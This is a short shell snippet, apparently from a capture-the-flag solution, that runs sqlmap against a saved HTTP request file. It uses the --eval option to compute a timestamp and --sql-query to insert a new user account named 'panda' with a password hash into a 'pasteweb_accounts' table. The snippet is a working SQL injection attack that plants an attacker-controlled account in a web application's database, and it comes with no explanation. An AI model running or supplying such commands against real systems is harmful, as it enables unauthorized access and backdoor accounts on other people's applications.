REQ_FILE="myrequest.txt"
python sqlmap.py -r $REQ_FILE --eval="import time;current_time=round(time.time())" --sql-query="INSERT INTO pasteweb_accounts(user_account, user_password) VALUES('panda', 'ce61649168c4550c2f7acab92354dc6e');"
